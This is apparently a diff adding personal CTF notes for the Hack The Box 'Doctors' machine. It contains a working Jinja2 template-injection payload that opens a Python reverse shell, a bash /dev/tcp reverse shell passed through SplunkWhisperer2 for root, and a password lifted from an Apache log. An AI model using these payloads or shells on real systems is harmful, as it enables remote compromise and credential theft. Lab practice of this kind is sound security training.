@@ -1,0 +1,27 @@
+//Based on TRX
+http://doctors.htb
+http://doctors.htb/post/new	//create post
+http://doctors.htb/archive	//source code of previous page after register + login
+
+http://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
+new post: ${{7*7}}
+/archive -> 49		//server side template injection
+new post: {{7*'7'}}
+/archive 7777777 -> Jinja2
+
+https://jayaye15.medium.com/jinja2-server-side-template-injection-ssti-9e209a6bbdf6	//Jinja reverse shell
+
+nc -lvnp 9001
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.31\",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\", \"-i\"]);'")}}{%endif%}{% endfor %}
+
+grep -ri 'password' /var/log
+/var/log/apache2/backup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453
+ "http://doctor.htb/reset_password"
+shaun : guitar123
+su shaun -		//got user
+
+https://book.hacktricks.xyz/linux-unix/privilege-escalation/splunk-lpe-and-persistence
+https://github.com/cnotin/SplunkWhisperer2
+rlwrap nc -lvnp 9003
+python PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.31 --username shaun --password Guitar123 --payload "bash -c 'bash -i >& /dev/tcp/10.10.14.31/9003 0>&1'"	//got root
+
